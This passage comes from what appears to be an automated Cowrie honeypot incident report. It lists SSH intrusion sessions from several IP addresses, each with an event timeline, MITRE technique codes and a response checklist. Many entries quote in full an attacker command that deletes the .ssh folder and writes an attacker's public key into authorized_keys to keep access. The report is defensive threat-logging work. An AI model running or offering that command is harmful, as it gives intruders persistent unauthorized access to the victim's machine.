| `2026-04-14 15:50:38` | `cowrie.command.failed` |
| `2026-04-14 15:50:39` | `cowrie.log.closed` |
| `2026-04-14 15:50:39` | `cowrie.session.params` |
| `2026-04-14 15:50:39` | `cowrie.command.input` |
| `2026-04-14 15:50:39` | `cowrie.session.file_download` |
| `2026-04-14 15:50:39` | `cowrie.log.closed` |
| `2026-04-14 15:50:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.16.214[.]226` to AbuseIPDB if not already reported
- [ ] Block `185.16.214[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc1fd0ddf6c9

| Field | Detail |
|---|---|
| **Source IP** | `49.64.169[.]153` |
| **First Seen** | 2026-04-14 15:50 |
| **Last Seen** | 2026-04-14 15:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:50:38` | `cowrie.session.connect` |
| `2026-04-14 15:50:38` | `cowrie.client.version` |
| `2026-04-14 15:50:38` | `cowrie.client.kex` |
| `2026-04-14 15:50:39` | `cowrie.login.success` |
| `2026-04-14 15:50:39` | `cowrie.session.params` |
| `2026-04-14 15:50:39` | `cowrie.command.input` |
| `2026-04-14 15:50:39` | `cowrie.command.failed` |
| `2026-04-14 15:50:39` | `cowrie.log.closed` |
| `2026-04-14 15:50:40` | `cowrie.session.params` |
| `2026-04-14 15:50:40` | `cowrie.command.input` |
| `2026-04-14 15:50:40` | `cowrie.session.file_download` |
| `2026-04-14 15:50:40` | `cowrie.log.closed` |
| `2026-04-14 15:50:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.64.169[.]153` to AbuseIPDB if not already reported
- [ ] Block `49.64.169[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d853a9c35508

| Field | Detail |
|---|---|
| **Source IP** | `172.191.157[.]64` |
| **First Seen** | 2026-04-14 15:50 |
| **Last Seen** | 2026-04-14 15:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:50:38` | `cowrie.session.connect` |
| `2026-04-14 15:50:39` | `cowrie.client.version` |
| `2026-04-14 15:50:39` | `cowrie.client.kex` |
| `2026-04-14 15:50:40` | `cowrie.login.success` |
| `2026-04-14 15:50:40` | `cowrie.session.params` |
| `2026-04-14 15:50:40` | `cowrie.command.input` |
| `2026-04-14 15:50:40` | `cowrie.command.failed` |
| `2026-04-14 15:50:40` | `cowrie.log.closed` |
| `2026-04-14 15:50:41` | `cowrie.session.params` |
| `2026-04-14 15:50:41` | `cowrie.command.input` |
| `2026-04-14 15:50:41` | `cowrie.session.file_download` |
| `2026-04-14 15:50:41` | `cowrie.log.closed` |
| `2026-04-14 15:50:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.157[.]64` to AbuseIPDB if not already reported
- [ ] Block `172.191.157[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b5b18687dea

| Field | Detail |
|---|---|
| **Source IP** | `185.16.214[.]226` |
| **First Seen** | 2026-04-14 15:50 |
| **Last Seen** | 2026-04-14 15:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:50:41` | `cowrie.session.connect` |
| `2026-04-14 15:50:41` | `cowrie.client.version` |
| `2026-04-14 15:50:42` | `cowrie.client.kex` |
| `2026-04-14 15:50:42` | `cowrie.login.success` |
| `2026-04-14 15:50:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.16.214[.]226` to AbuseIPDB if not already reported
- [ ] Block `185.16.214[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdb3bb04d55f

| Field | Detail |
|---|---|
| **Source IP** | `49.64.169[.]153` |
| **First Seen** | 2026-04-14 15:50 |
| **Last Seen** | 2026-04-14 15:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:50:42` | `cowrie.session.connect` |
| `2026-04-14 15:50:42` | `cowrie.client.version` |
| `2026-04-14 15:50:42` | `cowrie.client.kex` |
| `2026-04-14 15:50:43` | `cowrie.login.success` |
| `2026-04-14 15:50:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.64.169[.]153` to AbuseIPDB if not already reported
- [ ] Block `49.64.169[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-874ae8c35c0a

| Field | Detail |
|---|---|
| **Source IP** | `172.191.157[.]64` |
| **First Seen** | 2026-04-14 15:50 |
| **Last Seen** | 2026-04-14 15:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:50:44` | `cowrie.session.connect` |
| `2026-04-14 15:50:44` | `cowrie.client.version` |
| `2026-04-14 15:50:44` | `cowrie.client.kex` |
| `2026-04-14 15:50:45` | `cowrie.login.success` |
| `2026-04-14 15:50:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.157[.]64` to AbuseIPDB if not already reported
- [ ] Block `172.191.157[.]64` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c19a801a526

| Field | Detail |
|---|---|
| **Source IP** | `185.16.214[.]226` |
| **First Seen** | 2026-04-14 15:51 |
| **Last Seen** | 2026-04-14 15:51 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:51:12` | `cowrie.session.connect` |
| `2026-04-14 15:51:12` | `cowrie.client.version` |
| `2026-04-14 15:51:12` | `cowrie.client.kex` |
| `2026-04-14 15:51:13` | `cowrie.login.success` |
| `2026-04-14 15:51:13` | `cowrie.session.params` |
| `2026-04-14 15:51:13` | `cowrie.command.input` |
| `2026-04-14 15:51:13` | `cowrie.command.failed` |
| `2026-04-14 15:51:13` | `cowrie.log.closed` |
| `2026-04-14 15:51:14` | `cowrie.session.params` |
| `2026-04-14 15:51:14` | `cowrie.command.input` |
| `2026-04-14 15:51:14` | `cowrie.session.file_download` |
| `2026-04-14 15:51:14` | `cowrie.log.closed` |
| `2026-04-14 15:51:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.16.214[.]226` to AbuseIPDB if not already reported
- [ ] Block `185.16.214[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6539da8cf78b

| Field | Detail |
|---|---|
| **Source IP** | `49.64.169[.]153` |
| **First Seen** | 2026-04-14 15:51 |
| **Last Seen** | 2026-04-14 15:51 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:51:12` | `cowrie.session.connect` |
| `2026-04-14 15:51:12` | `cowrie.client.version` |
| `2026-04-14 15:51:12` | `cowrie.client.kex` |
| `2026-04-14 15:51:14` | `cowrie.login.success` |
| `2026-04-14 15:51:15` | `cowrie.session.params` |
| `2026-04-14 15:51:15` | `cowrie.command.input` |
| `2026-04-14 15:51:15` | `cowrie.command.failed` |
| `2026-04-14 15:51:15` | `cowrie.log.closed` |
| `2026-04-14 15:51:16` | `cowrie.session.params` |
| `2026-04-14 15:51:16` | `cowrie.command.input` |
| `2026-04-14 15:51:16` | `cowrie.session.file_download` |
| `2026-04-14 15:51:16` | `cowrie.log.closed` |
| `2026-04-14 15:51:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.64.169[.]153` to AbuseIPDB if not already reported
- [ ] Block `49.64.169[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb87c0817fea

| Field | Detail |
|---|---|
| **Source IP** | `185.16.214[.]226` |
| **First Seen** | 2026-04-14 15:51 |
| **Last Seen** | 2026-04-14 15:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:51:16` | `cowrie.session.connect` |
| `2026-04-14 15:51:16` | `cowrie.client.version` |
| `2026-04-14 15:51:16` | `cowrie.client.kex` |
| `2026-04-14 15:51:17` | `cowrie.login.success` |
| `2026-04-14 15:51:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.16.214[.]226` to AbuseIPDB if not already reported
- [ ] Block `185.16.214[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5a20deea472

| Field | Detail |
|---|---|
| **Source IP** | `49.64.169[.]153` |
| **First Seen** | 2026-04-14 15:51 |
| **Last Seen** | 2026-04-14 15:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:51:24` | `cowrie.session.connect` |
| `2026-04-14 15:51:24` | `cowrie.client.version` |
| `2026-04-14 15:51:25` | `cowrie.client.kex` |
| `2026-04-14 15:51:28` | `cowrie.login.success` |
| `2026-04-14 15:51:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.64.169[.]153` to AbuseIPDB if not already reported
- [ ] Block `49.64.169[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f6a019735ba

| Field | Detail |
|---|---|
| **Source IP** | `49.64.169[.]153` |
| **First Seen** | 2026-04-14 15:51 |
| **Last Seen** | 2026-04-14 15:51 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:51:34` | `cowrie.session.connect` |
| `2026-04-14 15:51:34` | `cowrie.client.version` |
| `2026-04-14 15:51:35` | `cowrie.client.kex` |
| `2026-04-14 15:51:36` | `cowrie.login.success` |
| `2026-04-14 15:51:36` | `cowrie.session.params` |
| `2026-04-14 15:51:36` | `cowrie.command.input` |
| `2026-04-14 15:51:36` | `cowrie.command.failed` |
| `2026-04-14 15:51:37` | `cowrie.log.closed` |
| `2026-04-14 15:51:37` | `cowrie.session.params` |
| `2026-04-14 15:51:37` | `cowrie.command.input` |
| `2026-04-14 15:51:38` | `cowrie.session.file_download` |
| `2026-04-14 15:51:38` | `cowrie.log.closed` |
| `2026-04-14 15:51:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.64.169[.]153` to AbuseIPDB if not already reported
- [ ] Block `49.64.169[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e435b2a9664a

| Field | Detail |
|---|---|
| **Source IP** | `49.64.169[.]153` |
| **First Seen** | 2026-04-14 15:51 |
| **Last Seen** | 2026-04-14 15:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:51:43` | `cowrie.session.connect` |
| `2026-04-14 15:51:43` | `cowrie.client.version` |
| `2026-04-14 15:51:43` | `cowrie.client.kex` |
| `2026-04-14 15:51:44` | `cowrie.login.success` |
| `2026-04-14 15:51:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.64.169[.]153` to AbuseIPDB if not already reported
- [ ] Block `49.64.169[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b377999d73c9

| Field | Detail |
|---|---|
| **Source IP** | `172.191.157[.]64` |
| **First Seen** | 2026-04-14 15:52 |
| **Last Seen** | 2026-04-14 15:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:52:25` | `cowrie.session.connect` |
| `2026-04-14 15:52:25` | `cowrie.client.version` |
| `2026-04-14 15:52:25` | `cowrie.client.kex` |
| `2026-04-14 15:52:26` | `cowrie.login.success` |
| `2026-04-14 15:52:26` | `cowrie.session.params` |
| `2026-04-14 15:52:26` | `cowrie.command.input` |
| `2026-04-14 15:52:26` | `cowrie.command.failed` |
| `2026-04-14 15:52:26` | `cowrie.log.closed` |
| `2026-04-14 15:52:27` | `cowrie.session.params` |
| `2026-04-14 15:52:27` | `cowrie.command.input` |
| `2026-04-14 15:52:27` | `cowrie.session.file_download` |
| `2026-04-14 15:52:27` | `cowrie.log.closed` |
| `2026-04-14 15:52:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.157[.]64` to AbuseIPDB if not already reported
- [ ] Block `172.191.157[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5a37ef46611

| Field | Detail |
|---|---|
| **Source IP** | `172.191.157[.]64` |
| **First Seen** | 2026-04-14 15:52 |
| **Last Seen** | 2026-04-14 15:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:52:30` | `cowrie.session.connect` |
| `2026-04-14 15:52:30` | `cowrie.client.version` |
| `2026-04-14 15:52:30` | `cowrie.client.kex` |
| `2026-04-14 15:52:31` | `cowrie.login.success` |
| `2026-04-14 15:52:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.157[.]64` to AbuseIPDB if not already reported
- [ ] Block `172.191.157[.]64` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35baf619b32d

| Field | Detail |
|---|---|
| **Source IP** | `103.218.242[.]31` |
| **First Seen** | 2026-04-14 15:53 |
| **Last Seen** | 2026-04-14 15:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:53:34` | `cowrie.session.connect` |
| `2026-04-14 15:53:34` | `cowrie.client.version` |
| `2026-04-14 15:53:35` | `cowrie.client.kex` |
| `2026-04-14 15:53:35` | `cowrie.login.success` |
| `2026-04-14 15:53:35` | `cowrie.session.params` |
| `2026-04-14 15:53:35` | `cowrie.command.input` |
| `2026-04-14 15:53:35` | `cowrie.command.failed` |
| `2026-04-14 15:53:35` | `cowrie.log.closed` |
| `2026-04-14 15:53:36` | `cowrie.session.params` |
| `2026-04-14 15:53:36` | `cowrie.command.input` |
| `2026-04-14 15:53:36` | `cowrie.session.file_download` |
| `2026-04-14 15:53:36` | `cowrie.log.closed` |
| `2026-04-14 15:53:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.218.242[.]31` to AbuseIPDB if not already reported
- [ ] Block `103.218.242[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6710f5e08a89

| Field | Detail |
|---|---|
| **Source IP** | `103.218.242[.]31` |
| **First Seen** | 2026-04-14 15:53 |
| **Last Seen** | 2026-04-14 15:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:53:37` | `cowrie.session.connect` |
| `2026-04-14 15:53:37` | `cowrie.client.version` |
| `2026-04-14 15:53:38` | `cowrie.client.kex` |
| `2026-04-14 15:53:38` | `cowrie.login.success` |
| `2026-04-14 15:53:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.218.242[.]31` to AbuseIPDB if not already reported
- [ ] Block `103.218.242[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44943e2cde9a

| Field | Detail |
|---|---|
| **Source IP** | `185.16.214[.]226` |
| **First Seen** | 2026-04-14 15:53 |
| **Last Seen** | 2026-04-14 15:53 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:53:47` | `cowrie.session.connect` |
| `2026-04-14 15:53:47` | `cowrie.client.version` |
| `2026-04-14 15:53:47` | `cowrie.client.kex` |
| `2026-04-14 15:53:48` | `cowrie.login.success` |
| `2026-04-14 15:53:48` | `cowrie.session.params` |
| `2026-04-14 15:53:48` | `cowrie.command.input` |
| `2026-04-14 15:53:48` | `cowrie.command.failed` |
| `2026-04-14 15:53:48` | `cowrie.log.closed` |
| `2026-04-14 15:53:49` | `cowrie.session.params` |
| `2026-04-14 15:53:49` | `cowrie.command.input` |
| `2026-04-14 15:53:49` | `cowrie.session.file_download` |
| `2026-04-14 15:53:49` | `cowrie.log.closed` |
| `2026-04-14 15:53:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.16.214[.]226` to AbuseIPDB if not already reported
- [ ] Block `185.16.214[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a1996312b23

| Field | Detail |
|---|---|
| **Source IP** | `185.16.214[.]226` |
| **First Seen** | 2026-04-14 15:53 |
| **Last Seen** | 2026-04-14 15:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:53:51` | `cowrie.session.connect` |
| `2026-04-14 15:53:51` | `cowrie.client.version` |
| `2026-04-14 15:53:52` | `cowrie.client.kex` |
| `2026-04-14 15:53:52` | `cowrie.login.success` |
| `2026-04-14 15:53:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.16.214[.]226` to AbuseIPDB if not already reported
- [ ] Block `185.16.214[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe715bc00d8c

